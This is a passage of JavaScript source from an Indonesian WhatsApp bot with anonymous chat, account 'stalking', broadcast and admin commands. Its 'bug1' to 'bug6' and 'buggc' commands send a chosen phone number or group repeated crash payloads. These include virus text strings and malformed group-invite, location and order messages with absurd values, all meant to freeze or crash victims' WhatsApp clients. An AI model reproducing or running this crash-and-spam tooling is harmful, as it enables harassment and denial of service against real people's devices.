if (cekUser("id", sender) == null) return sendMessRegis(from)
if (isGroup) return reply(mess.private)
let romoe = Object.values(anonymous).find(room => anonyCheck(sender, room) && room.state == 'CHATTING')
var but = [
{ buttonId: prefix+'start', buttonText: { displayText: "🔎 SEARCH 🔎" }, type: 1 }
]
if (!romoe) {
var teks = `[⚠️] Kamu belum pernah memulai chat! ❌`
await ronzz.sendMessage(from, { text: teks, footer: `${botName} © 2022`, buttons: but })
} else {
let rms = Object.values(anonymous).find(room => [room.a, room.b].includes(sender) && room.state == "CHATTING")
var partnerJID = anonyOther(sender, rms)
var res = await ronzz.sendContact(partnerJID, [sender.split("@")[0]])
ronzz.sendMessage(from, { text: '[✅] Berhasil mengirim profil ke teman chat anda!' }, { quoted: msg })
ronzz.sendMessage(partnerJID, { text: '[👨👩] Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
}
}
break

case 'anonymous':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
var buttonMessage = {
text: `Hai ${pushname !== undefined ? pushname : 'Kak'} Selamat Datang di Anonymous Chat\n\nKetik ${prefix}search untuk mencari Teman Chat anda, atau bisa pencet tombol Search dibawah ini.`,
footer: `${botName} © 2022`,
buttons: [
{ buttonId: '#start', buttonText: {displayText: 'Start'}, type: 1}
],
headerType: 1
}
ronzz.sendMessage(from, buttonMessage)
}
break

case 'stalkff':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex: ${prefix+command} Id Ff\n\nContoh :\n${prefix+command} 1903450988`)
let data_ff = await stalkff(q)
if (data_ff.status !== 200) return reply('Error id tidak di temukan')
reply(data_ff.nickname)
}
addCmd(command, 1, db_dashboard)
break

case 'stalkml':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex: ${prefix+command} Id|Zone\n\nContoh :\n${prefix+command} 738367068|8944`)
var data_ml = await stalkml(q.split('|')[0], q.split('|')[1])
if (data_ml.status !== 200) return reply('Error id/zone tidak di temukan')
reply(data_ml.nickname)
}
break

case 'stalknpm':{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Id Npm\n\nContoh :\n${prefix+command} @adiwajshing/baileys`)
var x = await fetchJson(`https://api.popcat.xyz/npm?q=${q}`)
if (x.error) return reply(x.error)
var npm_text =`*NPM STALKER*
name : ${x.name}
version : ${x.version}
description : ${x.description}
author : ${x.author}
author_email : ${x.author_email}
last_published : ${x.last_published}
maintainers : ${x.maintainers}
repository : ${x.repository}

keywords : ${x.keywords}`
reply(npm_text)
}
addCmd(command, 1, db_dashboard)
break

case "stalkgithub":{
if (cekUser("id", sender) == null) return sendMessRegis(from)
if (!q) return reply(`Ex : ${prefix+command} Username\n\nContoh :\n${prefix+command} Ronzz-Ofc`)
reply(mess.wait)
var nama = q
var git = await fetchJson(`https://api.github.com/users/${nama}`)
var tbGit = await getBuffer(git.avatar_url)
let textGitthub =`*STALK-GITHUB*
id : ${git.id}
login : ${git.login}
html_url : ${git.html_url}
type : ${git.type}
admin : ${git.admin}
name : ${git.name}
location : ${git.location}
bio : ${git.bio}
public_repos : ${git.public_repos}
followers : ${git.followers}
following : ${git.following}
created : ${git.created_at}
updated : ${git.updated_at}`
ronzz.sendMessage(from, { image: tbGit, caption: textGitthub }, {quoted:msg})
}
addCmd(command, 1, db_dashboard)
break

case 'broadcast': case 'bc':
if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`Kirim perintah ${prefix+command} teks`)
let data_orang = await store.chats.all()
let data_teks = `*──── BROADCAST ────*\n${q}`
let data_button = [
{ buttonId: `#menu`, buttonText: { displayText: '📓 Menu' }, type: 1 },
{ buttonId: `#owner`, buttonText: { displayText: '🙍‍♂️ Owner' }, type: 1 },
{ buttonId: `#donasi`, buttonText: { displayText: '💰 Donate' }, type: 1 }
]
let data_footer = `${botName} © 2022`
var listMsg = {
image: fs.readFileSync(bc), 
caption: data_teks, 
buttons: data_button, 
footer: data_footer
}
for (let i of data_orang) { 
ronzz.sendMessage(i.id, { location: { jpegThumbnail: await reSize(fs.readFileSync(bc), 300, 150) }, caption: data_teks, footer: data_footer, buttons: data_button })
await sleep(1000)
}
reply(`Sukses mengirim pesan siaran kepada ${data_orang.length} chat`)
addCmd(command, 1, db_dashboard)
break

case 'join':{
 if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`Kirim perintah ${prefix+command} _linkgrup_`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var data = await ronzz.groupAcceptInvite(ini_urrrl)
reply(`*Sukses...*`)
}
addCmd(command, 1, db_dashboard)
break

case 'leave':
if (!isOwner && !fromMe) return reply(mess.owner)
if (!isGroup) return reply(mess.OnlyGrup)
reply(`Selamat tinggal👋`)
setTimeout( () => {
ronzz.groupLeave(from)
}, 700)
addCmd(command, 1, db_dashboard)
break

case 'addprem':{
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Format salah ❌\n\nContoh :\n ${prefix+command} 628817839722`)
var nomorPrem = q+'@s.whatsapp.net'
if (cekUser("id", nomorPrem) == null) return reply('Dia tidak terdaftar di database.')
if (cekUser("premium", nomorPrem) == true) return reply('Dia sudah menjadi user premium.')
setUser("premium", nomorPrem, true)
ronzz.sendMessage(from, { text: `*INFO PREMIUM*\n*⭔ID:* @${nomorPrem.split('@')[0]}\n*⭔Status:* Aktif`, mentions: [nomorPrem]}, { quoted: msg })
}
break

case 'delprem':{
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Format salah ❌\n\nContoh :\n ${prefix+command} 628817839722`)
var nomorPrem = q+'@s.whatsapp.net'
if (cekUser("id", nomorPrem) == null) return reply('Dia tidak terdaftar di database.')
if (cekUser("premium", nomorPrem) == false) return reply('Dia belum menjadi user premium.')
setUser("premium", nomorPrem, false)
ronzz.sendMessage(from, { text: `*INFO PREMIUM*\n*⭔ID:* @${nomorPrem.split('@')[0]}\n*⭔Status:* Tidak Aktif`, mentions: [nomorPrem]}, { quoted: msg })
}
break

case 'block':{
if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Block\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await ronzz.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Nomor')
}
addCmd(command, 1, db_dashboard)
break

case 'server':
case 'cekatlantic':
if (!isOwner) return reply(mess.owner)
axios({
method: "POST",
url: "https://atlantic-pedia.co.id/api/profile",
data: qs.stringify({
key: apikeyAntlatic
})
}).then(data => {
data = data.data.data
var teks = `*ATLANTIC PEDIA PROFILE*\n*Username :* ${data.username}\n*Fullname :* ${data.full_name}\n*Sisa Saldo :* Rp${toRupiah(data.balance)}\n*Total Order :* ${data.order}\n*Pemakaian Saldo :* Rp${toRupiah(data.spent)}`
reply(teks)
})
break

case 'setexif':
if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`harus di isi semua!!\n\n_Contoh_\n${prefix+command} packname|author`)
var namaPack_ny = q.split('|')[0] ? q.split('|')[0] : q
var authorPack_ny = q.split('|')[1] ? q.split('|')[1] : ''
if (authorPack_ny.length <1) return reply(`harus di isi semua!!\n\n_Contoh_\n${prefix+command} packname|author`)
exif.create(namaPack_ny, authorPack_ny)
reply('Sukses membuat exif')
addCmd(command, 1, db_dashboard)
break

case 'resetdb':{
if (!isOwner && !fromMe) return reply(mess.owner)
let para_kos = "[]"
db_dashboard.splice(para_kos)
fs.writeFileSync('./database/dashboard.json', JSON.stringify(db_dashboard))
user.splice(para_kos)
fs.writeFileSync('./database/user.json', JSON.stringify(user))
db_error.splice(para_kos)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
anonymous.splice(para_kos)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonymous))
}
reply('Sukses Restart database.')
addCmd(command, 1, db_dashboard)
break

case 'error':{
if (!isOwner) return reply(mess.owner)
let ertxt = `*Server Error*\n*Tercatat:* ${db_error.length}\n\n`
for (let i of db_error){
ertxt +=`*Dari:* ${i.dari}\n*Nomor:* ${i.nomor.split("@")[0]}\n*Jam:* ${i.jam} WIB\n*Tanggal:* ${i.tanggal}\n*Type:* ${i.error}\n\n`
}
ronzz.sendMessage(from, { text: `${ertxt}`}, { quoted: msg })
}
break

case 'unblock':{
if (!isOwner && !fromMe) return reply(mess.owner)
if (!q) return reply(`Ex : ${prefix+command} Nomor Yang Ingin Di Unblock\n\nContoh :\n${prefix+command} 628xxxx`)
let nomorNya = q
await ronzz.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock") // Unblock user
reply('Sukses Unblock Nomor')
}
addCmd(command, 1, db_dashboard)
break

case 'creategc':
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`*Ex :*\n${prefix+command} Nama Group\n\nContoh :\n${prefix+command} Ronzz YT Team`)
var nama_nya = q
let cret = await ronzz.groupCreate(nama_nya, [])
let response = await ronzz.groupInviteCode(cret.id)
var teks_creategc = `「 *Create Group* 」
_*Name :* ${cret.subject}_
_*Owner :* @${cret.owner.split("@")[0]}_
_*Date :* ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY")}_
_*Time :* ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("HH:mm:ss")} WIB_

*Link Create Group* :
https://chat.whatsapp.com/${response}`
reply(teks_creategc)
addCmd(command, 1, db_dashboard)
break

case 'mysesi':case 'sendsesi':case 'session':
if (!isOwner) return reply(mess.owner)
let ini_nama_sessionya = 'session'
var anumu = await fs.readFileSync(`./${ini_nama_sessionya}.json`)
ronzz.sendMessage(from, { document: anumu, mimetype: 'document/application', fileName: 'session.json'}, {quoted: msg } )
reply(`*Note :*\n_Session Bot Bersifat Untuk Pribadi Dari Owner Maupun Bot, Tidak Untuk User Bot Ataupun Pengguna Bot._`)
reply(`_Sedang Mengirim Document_\n_Nama Session : ${sessionName}.json_\n_Mohon Tunggu Sebentar..._`)
addCmd(command, 1, db_dashboard)
break

case 'setpp': case 'setppbot':
if (!isOwner && !fromMe) return reply(mess.owner)
if (isImage || isQuotedImage) {
var media = await downloadAndSaveMediaMessage('image', 'ppbot.jpeg')
if (args[0] == "panjang") {
var { img } = await generateProfilePicture(media)
await ronzz.query({ tag: 'iq', attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture' },
content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }] })
fs.unlinkSync(media)
reply(`Sukses`)
} else {
var data = await ronzz.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
reply(`Sukses`)
}
} else {
reply(`Kirim/balas gambar dengan caption ${prefix+command} untuk mengubah foto profil bot`)
}
addCmd(command, 1, db_dashboard)
break

case 'setbiobot':
if (!isOwner && !fromMe) return reply(mess.owner)
let ini_biobot = q.split(' ')[0] ? q.split(' ')[0] : ''
if (ini_biobot.length <1) return reply(`_Contoh_\n${prefix+command} text`)
ronzz.setStatus(ini_biobot)
reply('*Sukses mengganti bio bot.*')
addCmd(command, 1, db_dashboard)
break

case 'ip':
case 'cekip':
if (!isOwner) return reply(mess.owner)
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply(res.data.data)
reply('IP Sudah Tersambung Ke Server.')
})
break

case 'bug1':{
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {text:`VelzzyBOT ${virtex(prefix)}`}, {quoted:virusnya})
await sleep(1000)
}
mentions(`Sukses *${command}* to @${num.split('@')[0]} jumlah spam : ${jumlah}`, [num])
}
break

case 'bug2':{
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {text:`VelzzyBOT ${virus}`}, {quoted:virusnya})
await sleep(1000)
}
mentions(`Sukses *${command}* to @${num.split('@')[0]} jumlah spam : ${jumlah}`, [num])
}
break

case 'bug3':{
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {text:`VelzzyBOT ${philips}`}, {quoted:virusnya})
await sleep(1000)
}
mentions(`Sukses *${command}* to @${num.split('@')[0]} jumlah spam : ${jumlah}`, [num])
}
break

case 'bug4': {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./options/image/log.jpg') }, { upload: ronzz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME Ronzz YT${ngazap(prefix)}`,
"groupName": `MY NAME Ronzz YT${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: num, quoted: virusnya })
ronzz.relayMessage(num, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(1000)
}
mentions(`*Sukses send ${command} to @${num.split('@')[0]}jumlah : ${jumlah}`, [num])
}
break

case 'bug5': {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./options/image/log.jpg') }, { upload: ronzz.waUploadToServer })
var location = generateWAMessageFromContent(num, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© Ronzz YT${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: num, quoted: virusnya })
ronzz.relayMessage(num, location.message, { messageId: location.key.id })
}
mentions(`*Sukses send ${command} to @${num.split('@')[0]}jumlah : ${jumlah}`, [num])
}
break

case 'bug6': {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
var num = q.split('|')[0]+"@s.whatsapp.net"
var jumlah = q.split('|')[1]
if (!num) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
if (!jumlah) return reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx|jumlah`)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./options/image/log.jpg') }, { upload: ronzz.waUploadToServer })
var order = generateWAMessageFromContent(num, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Ronzz YT${ngazap(prefix)}`,
"jpegThumbnail": fs.readFileSync('./options/image/log.jpg'),
"orderTitle": `© Ronzz YT${ngazap(prefix)}`,
"sellerJid": "628817839722@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: num, quoted: virusnya })
ronzz.relayMessage(num, order.message, { messageId: order.key.id })
}
mentions(`Sukses Send ${command} To: @${num.split('@')[0]} Jumlah : ${jumlah}`, [num])
}
break

case 'buggc':{
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(20)
ronzz.sendMessage(from, {text: "Xd"}, {quoted: virusnya})
await sleep(7000)
ronzz.sendMessage(from, {text: "*Sukses bro...*"}, {quoted: virusnya})
}
break

case 'verify':{
if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar di database.')
try {
var ppnu = await ronzz.profilePictureUrl(sender, 'image')
} catch {
var ppnu = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'
}
const nomor_resi = require("crypto").randomBytes(5).toString("hex").toUpperCase()
let resiNya = `${nomor_resi}`
let registerOnNya = `${jamwib} *WIB* ${tanggal}`
let teks_daftar =`*──── TERVERIFIKASI ────*
*ID :* ${sender.split('@')[0]}
*Name :* ${pushname}
*Premium :* ✘
*Resi :* ${resiNya}
*Status :* ${isOwner? 'Owner':'User'} ${botName}
*User Ke :* ${user.length}
*Saldo :* Rp${toRupiah(cekSaldo(sender, db_saldo))}
*Hit Cmd :* 1`
user.push({id: sender, name: pushname, premium: false, resi: resiNya, registerOn: registerOnNya})
fs.writeFileSync('./database/user.json', JSON.stringify(user))
setUser("premium", sender, false)
ronzz.sendMessage(from, { text: `*Memuat Data* › @${sender.split('@')[0]}`, mentions: [sender]}, { quoted: msg })
ronzz.sendMessage(from, { image: { url: ppnu }, caption: teks_daftar, buttons: [{buttonId: prefix+'menu', buttonText: { displayText: '📓 Menu' }, type: 1}], footer: `${botName} © 2022`}, { quoted: msg }) 
}
addCmd(command, 1, db_dashboard)
break

default:
if (!isGroup && !isCmd) {
if (cekMenfes("id", sender) == null) return
if (cekMenfes("teman", sender) == false) return
const reactionMessage = { react: { text: "🗣️", key: msg.key}}
ronzz.sendMessage(from, reactionMessage)
if (m.messages[0].type == "conversation" || m.messages[0].type == "extendedTextMessage") {
try{ var text1 = m.messages[0].message.extendedTextMessage.text } catch (err) { var text1 = m.messages[0].message.conversation }
ronzz.sendMessage(cekMenfes("teman", sender), {text: text1 }, {quoted:{ key: {fromMe: false, participant: `${botNumber}`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"conversation": "━━━━ *PESAN-DIBALAS* ━━━━"}} })
let menfes_kosong = "[]"
db_menfes.splice(menfes_kosong)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
reply('Pesan balasan kamu diteruskan')
}}
}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
const pushname = msg.pushName
const from = msg.key.remoteJid
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const moment = require("moment-timezone");
const jamwib = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
db_error.push({"tanggal": tanggal, "jam": jamwib, "error": err, "dari": pushname, "nomor": sender})
fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
var errny =`*SERVER ERROR*
*Dari:* @${sender.split("@")[0]}
*Name:* ${pushname}
*Jam:* ${jamwib}
*Tanggal:* ${tanggal}
*Tercatat:* ${db_error.length}
*Type:* ${err}`
ronzz.sendMessage(`${ownerNomer}@s.whatsapp.net`, { text: `${errny}`, mentions: [sender]})
}}